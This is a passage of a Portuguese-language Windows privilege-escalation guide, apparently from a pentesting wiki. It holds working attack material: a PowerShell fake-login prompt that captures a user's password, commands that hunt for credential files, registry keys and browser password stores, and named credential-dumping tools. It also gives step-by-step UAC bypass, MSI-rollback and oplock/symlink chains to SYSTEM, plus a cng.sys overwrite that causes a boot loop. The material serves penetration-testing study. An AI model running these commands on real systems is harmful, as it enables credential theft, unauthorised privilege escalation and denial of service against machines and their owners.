$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possíveis nomes de arquivos contendo credenciais**

Arquivos conhecidos que em algum momento continham **passwords** em **clear-text** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Procure todos os arquivos propostos:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na RecycleBin

Você também deve verificar a Bin para procurar credenciais dentro dela

Para **recuperar senhas** salvas por vários programas você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro do registro

**Outras possíveis chaves do registro com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extrair chaves openssh do registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Histórico dos navegadores

Você deve verificar por dbs onde senhas de **Chrome ou Firefox** são armazenadas.\
Também verifique o histórico, bookmarks e favourites dos navegadores para talvez algumas **senhas estejam** armazenadas lá.

Ferramentas para extrair senhas dos navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite **intercomunicação** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado via** um class ID (CLSID) e cada componente expõe funcionalidade por uma ou mais interfaces, identificadas por interface IDs (IIDs).

Classes e interfaces COM são definidas no registry em **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** respectivamente. Esse registry é criado pela fusão de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro dos CLSIDs desse registry você pode encontrar a chave filha **InProcServer32** que contém um **valor padrão** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basicamente, se você puder **substituir qualquer uma das DLLs** que serão executadas, você poderia **elevar privilégios** se essa DLL for executada por um usuário diferente.

Para aprender como atacantes usam COM Hijacking como um mecanismo de persistência, verifique:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Busca genérica de senhas em arquivos e registry**

**Pesquisar conteúdos de arquivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Procurar um arquivo com um determinado nome**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquise no registry por nomes de chaves e passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine que **um processo executando como SYSTEM abre um novo processo** (`OpenProcess()`) com **full access**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com low privileges, mas herdando todos os open handles do processo principal**.\
Então, se você tiver **full access ao processo com low privileges**, você pode pegar o **open handle para o processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para mais informações sobre **como detectar e explorar esta vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia este **outro post para uma explicação mais completa sobre como testar e abusar de mais open handlers de processos e threads herdados com diferentes níveis de permissões (não apenas full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmentos de memória compartilhada, chamados de **pipes**, permitem comunicação entre processos e transferência de dados.

O Windows fornece um recurso chamado **Named Pipes**, permitindo que processos não relacionados compartilhem dados, até mesmo em redes diferentes. Isso se assemelha a uma arquitetura cliente/servidor, com funções definidas como **named pipe server** e **named pipe client**.

Quando dados são enviados por um pipe por um **cliente**, o **server** que configurou o pipe tem a capacidade de **assumir a identidade** do **cliente**, desde que tenha os direitos **SeImpersonate** necessários. Identificar um **processo privilegiado** que se comunica por meio de um pipe que você consegue imitar oferece uma oportunidade de **obter privilégios mais altos** ao adotar a identidade desse processo quando ele interagir com o pipe que você estabeleceu. Para instruções sobre como executar esse tipo de ataque, guias úteis podem ser encontrados [**aqui**](named-pipe-client-impersonation.md) e [**aqui**](#from-high-integrity-to-system).

Também a ferramenta a seguir permite **interceptar uma comunicação de named pipe com uma ferramenta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e ver todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

O serviço Telephony (TapiSrv) em modo servidor expõe `\\pipe\\tapsrv` (MS-TRP). Um cliente autenticado remoto pode abusar do caminho assíncrono baseado em mailslot de eventos para transformar `ClientAttach` em uma **gravação arbitrária de 4 bytes** em qualquer arquivo existente gravável por `NETWORK SERVICE`, depois obter direitos de administrador do Telephony e carregar uma DLL arbitrária como o serviço. Fluxo completo:

- `ClientAttach` com `pszDomainUser` definido para um caminho existente gravável → o serviço o abre via `CreateFileW(..., OPEN_EXISTING)` e o usa para gravações assíncronas de eventos.
- Cada evento grava o `InitContext` controlado pelo atacante de `Initialize` nesse handle. Registre um line app com `LRegisterRequestRecipient` (`Req_Func 61`), acione `TRequestMakeCall` (`Req_Func 121`), busque via `GetAsyncEvents` (`Req_Func 0`), depois cancele o registro/desligue para repetir gravações determinísticas.
- Adicione você mesmo a `[TapiAdministrators]` em `C:\Windows\TAPI\tsec.ini`, reconecte e então chame `GetUIDllName` com um caminho de DLL arbitrário para executar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Mais detalhes:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Confira a página **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Ao obter uma shell como um usuário, pode haver scheduled tasks ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura as linhas de comando dos processos a cada dois segundos e compara o estado atual com o anterior, exibindo quaisquer diferenças.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Roubar senhas de processos

## De Usuário Privilegiado Baixo para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se você tiver acesso à interface gráfica (via console ou RDP) e o UAC estiver habilitado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.

Isso torna possível escalar privilégios e contornar o UAC ao mesmo tempo com a mesma vulnerabilidade. Além disso, não há necessidade de instalar nada e o binário usado durante o processo é assinado e emitido pela Microsoft.

Alguns dos sistemas afetados são os seguintes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar essa vulnerabilidade, é necessário realizar os seguintes passos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator Medium para High Integrity Level / UAC Bypass

Leia isto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Depois **leia isto para aprender sobre UAC e UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Arbitrary Folder Delete/Move/Rename para SYSTEM EoP

A técnica descrita [**neste post do blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) com um exploit code [**disponível aqui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

O ataque basicamente consiste em abusar do recurso de rollback do Windows Installer para substituir arquivos legítimos por maliciosos durante o processo de desinstalação. Para isso, o atacante precisa criar um **malicious MSI installer** que será usado para sequestrar a pasta `C:\Config.Msi`, que depois será usada pelo Windows Installer para armazenar rollback files durante a desinstalação de outros pacotes MSI, onde os rollback files teriam sido modificados para conter o malicious payload.

A técnica resumida é a seguinte:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crie um `.msi` que instale um arquivo inofensivo (por exemplo, `dummy.txt`) em uma pasta gravável (`TARGETDIR`).
- Marque o installer como **"UAC Compliant"**, para que um **non-admin user** possa executá-lo.
- Mantenha um **handle** aberto para o arquivo após a instalação.

- Step 2: Begin Uninstall
- Desinstale o mesmo `.msi`.
- O processo de uninstall começa a mover arquivos para `C:\Config.Msi` e renomeá-los para arquivos `.rbf` (rollback backups).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` para detectar quando o arquivo se torna `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- O `.msi` inclui uma **custom uninstall action (`SyncOnRbfWritten`)** que:
- Sinaliza quando `.rbf` tiver sido escrito.
- Depois **waits** em outro evento antes de continuar o uninstall.

- Step 4: Block Deletion of `.rbf`
- Quando sinalizado, **open the `.rbf` file** sem `FILE_SHARE_DELETE` — isso **impede que ele seja deletado**.
- Depois **signal back** para que o uninstall possa terminar.
- O Windows Installer falha ao deletar o `.rbf` e, como não consegue deletar todo o conteúdo, **`C:\Config.Msi` não é removido**.

- Step 5: Manually Delete `.rbf`
- Você (attacker) deleta o arquivo `.rbf` manualmente.
- Agora **`C:\Config.Msi` está vazio**, pronto para ser hijacked.

> Neste ponto, **trigger the SYSTEM-level arbitrary folder delete vulnerability** para deletar `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recrie a pasta `C:\Config.Msi` você mesmo.
- Defina **weak DACLs** (por exemplo, Everyone:F), e **mantenha um handle aberto** com `WRITE_DAC`.

- Step 7: Run Another Install
- Instale o `.msi` novamente, com:
- `TARGETDIR`: Local gravável.
- `ERROROUT`: Uma variável que dispara uma falha forçada.
- Esta instalação será usada para disparar **rollback** novamente, que lê `.rbs` e `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` para monitorar `C:\Config.Msi` até que um novo `.rbs` apareça.
- Capture o nome do arquivo.

- Step 9: Sync Before Rollback
- O `.msi` contém uma **custom install action (`SyncBeforeRollback`)** que:
- Sinaliza um evento quando o `.rbs` é criado.
- Depois **waits** antes de continuar.

- Step 10: Reapply Weak ACL
- Depois de receber o evento `.rbs created`:
- O Windows Installer **reapplies strong ACLs** em `C:\Config.Msi`.
- Mas como você ainda tem um handle com `WRITE_DAC`, você pode **reapply weak ACLs** novamente.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sobrescreva o arquivo `.rbs` com um **fake rollback script** que diz ao Windows para:
- Restaurar seu arquivo `.rbf` (malicious DLL) em um **privileged location** (por exemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Dropar seu fake `.rbf` contendo uma **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Sinalize o evento de sync para que o installer retome.
- Uma **type 19 custom action (`ErrorOut`)** está configurada para **falhar intencionalmente a instalação** em um ponto conhecido.
- Isso faz com que o **rollback** comece.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lê seu `.rbs` malicioso.
- Copia sua DLL `.rbf` para o local de destino.
- Agora você tem sua **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Execute um binário confiável **auto-elevated** (por exemplo, `osk.exe`) que carrega a DLL que você sequestrou.
- **Boom**: Seu código é executado **as SYSTEM**.


### De Arbitrary File Delete/Move/Rename para SYSTEM EoP

A técnica principal de rollback MSI (a anterior) assume que você consegue deletar uma **pasta inteira** (por exemplo, `C:\Config.Msi`). Mas e se sua vulnerabilidade só permitir **arbitrary file deletion** ?

Você poderia explorar **NTFS internals**: toda pasta tem um hidden alternate data stream chamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream armazena os **metadados de índice** da pasta.

Então, se você **deletar o stream `::$INDEX_ALLOCATION`** de uma pasta, o NTFS **remove a pasta inteira** do sistema de arquivos.

Você pode fazer isso usando APIs padrão de deleção de arquivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mesmo que você esteja chamando uma API de delete de *arquivo*, ela **deleta a própria pasta**.

### De Deleção de Conteúdo de Pasta para SYSTEM EoP
E se seu primitive não permitir deletar arquivos/pastas arbitrários, mas **permitir a deleção do *conteúdo* de uma pasta controlada pelo atacante**?

1. Passo 1: Configurar uma pasta e um arquivo isca
- Criar: `C:\temp\folder1`
- Dentro dela: `C:\temp\folder1\file1.txt`

2. Passo 2: Colocar um **oplock** em `file1.txt`
- O oplock **pausa a execução** quando um processo privilegiado tenta deletar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Etapa 3: Acionar o processo SYSTEM (por exemplo, `SilentCleanup`)
- Este processo varre pastas (por exemplo, `%TEMP%`) e tenta excluir o conteúdo delas.
- Quando ele chega em `file1.txt`, o **oplock é acionado** e entrega o controle para o seu callback.

4. Etapa 4: Dentro do callback do oplock – redirecionar a exclusão

- Opção A: Mover `file1.txt` para outro lugar
- Isso esvazia `folder1` sem quebrar o oplock.
- Não exclua `file1.txt` diretamente — isso liberaria o oplock prematuramente.

- Opção B: Converter `folder1` em um **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Crie um **symlink** em `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Isso tem como alvo o fluxo interno do NTFS que armazena os metadados da pasta — ao excluí-lo, a pasta é excluída.

5. Step 5: Release the oplock
- O processo SYSTEM continua e tenta excluir `file1.txt`.
- Mas agora, devido ao junction + symlink, ele está na verdade excluindo:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` é excluído pelo SYSTEM.

### De Arbitrary Folder Create para Permanent DoS

Explorar um primitive que permite **criar uma pasta arbitrária como SYSTEM/admin** — mesmo se **você não puder gravar arquivos** ou **definir permissões fracas**.

Crie uma **pasta** (não um arquivo) com o nome de um **driver crítico do Windows**, por exemplo:
```
C:\Windows\System32\cng.sys
```
- Esse caminho normalmente corresponde ao driver em modo kernel `cng.sys`.
- Se você **pré-criá-lo como uma pasta**, o Windows falha ao carregar o driver real no boot.
- Então, o Windows tenta carregar `cng.sys` durante o boot.
- Ele encontra a pasta, **falha ao resolver o driver real** e **crasha ou interrompe o boot**.
- **Não há fallback**, e **não há recuperação** sem intervenção externa (por exemplo, reparo de boot ou acesso ao disco).

### De caminhos privilegiados de log/backup + symlinks de OM para sobrescrita arbitrária de arquivo / boot DoS

Quando um **serviço privilegiado** grava logs/exports em um caminho lido de uma **configuração gravável**, redirecione esse caminho com **Object Manager symlinks + NTFS mount points** para transformar a gravação privilegiada em uma sobrescrita arbitrária (mesmo **sem** SeCreateSymbolicLinkPrivilege).

**Requisitos**
- A configuração que armazena o caminho de destino é gravável pelo atacante (por exemplo, `%ProgramData%\...\.ini`).
- Capacidade de criar um mount point para `\RPC Control` e um OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uma operação privilegiada que escreva nesse caminho (log, export, report).

**Exemplo de cadeia**
1. Leia a configuração para recuperar o destino privilegiado do log, por exemplo `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` em `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirecione o caminho sem admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espere o componente privilegiado escrever o log (por exemplo, o admin aciona "send test SMS"). A escrita agora cai em `C:\Windows\System32\cng.sys`.
4. Inspecione o alvo sobrescrito (hex/PE parser) para confirmar a corrupção; reiniciar força o Windows a carregar o caminho do driver adulterado → **boot loop DoS**. Isso também se generaliza para qualquer arquivo protegido que um serviço privilegiado abra para escrita.

> `cng.sys` normalmente é carregado de `C:\Windows\System32\drivers\cng.sys`, mas se existir uma cópia em `C:\Windows\System32\cng.sys` ela pode ser tentada primeiro, tornando-o um sink de DoS confiável para dados corrompidos.



## **From High Integrity to System**

### **New service**

Se você já estiver executando em um processo High Integrity, o **caminho para SYSTEM** pode ser fácil, simplesmente **criando e executando um novo serviço**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Ao criar um binary de service, certifique-se de que ele seja um service válido ou que o binary execute as ações necessárias rapidamente, pois ele será encerrado em 20s se não for um service válido.

### AlwaysInstallElevated

A partir de um processo High Integrity você pode tentar **habilitar as entradas de registry AlwaysInstallElevated** e **instalar** um reverse shell usando um wrapper _.msi_.\
[Mais informações sobre as registry keys envolvidas e como instalar um pacote _.msi_ aqui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se você tiver esses token privileges (provavelmente você encontrará isso em um processo já High Integrity), você poderá **abrir quase qualquer process** (não protegidos) com o privilege SeDebug, **copiar o token** do process, e criar um **process arbitrário com esse token**.\
Usando essa técnica, normalmente, você **seleciona qualquer process rodando como SYSTEM com todos os token privileges** (_sim, você pode encontrar processos SYSTEM sem todos os token privileges_).\
**Você pode encontrar um** [**exemplo de código executando a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica é usada pelo meterpreter para escalar em `getsystem`. A técnica consiste em **criar um pipe e então criar/abusar de um service para escrever nesse pipe**. Depois, o **server** que criou o pipe usando o privilege **`SeImpersonate`** poderá **impersonate o token** do client do pipe (o service), obtendo privileges de SYSTEM.\
Se você quiser [**aprender mais sobre name pipes você deve ler isto**](#named-pipe-client-impersonation).\
Se você quiser ler um exemplo de [**como ir de high integrity para System usando name pipes você deve ler isto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se você conseguir **hijackar uma dll** que esteja sendo **loaded** por um **process** rodando como **SYSTEM**, você poderá executar código arbitrário com essas permissions. Portanto, Dll Hijacking também é útil para esse tipo de privilege escalation e, além disso, é **muito mais fácil de conseguir a partir de um processo high integrity**, pois ele terá **write permissions** nas pastas usadas para carregar dlls.\
**Você pode** [**aprender mais sobre Dll hijacking aqui**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Melhor tool para procurar vetores de Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica misconfigurations e sensitive files (**[**veja aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica algumas possíveis misconfigurations e coleta info (**[**veja aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessões salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough em local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai crendentials do Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Faz spray de passwords coletadas pela domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é uma PowerShell ADIDNS/LLMNR/mDNS spoofer e man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Procura vulnerabilities conhecidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura vulnerabilities conhecidas de privesc (precisa ser compilado usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host procurando misconfigurations (mais uma tool de coleta de info do que de privesc) (precisa ser compilado) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credentials de muitos softwares (precompiled exe no github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica misconfiguration (executable precompiled no github). Não recomendado. Não funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possíveis misconfigurations (exe from python). Não recomendado. Não funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool criada com base neste post (não precisa de accesschk para funcionar corretamente, mas pode usá-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída de **systeminfo** e recomenda exploits que funcionam (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída de **systeminfo** e recomenda exploits que funcionam (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Você precisa compilar o projeto usando a versão correta do .NET ([veja isto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão instalada do .NET no host vítima, você pode fazer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
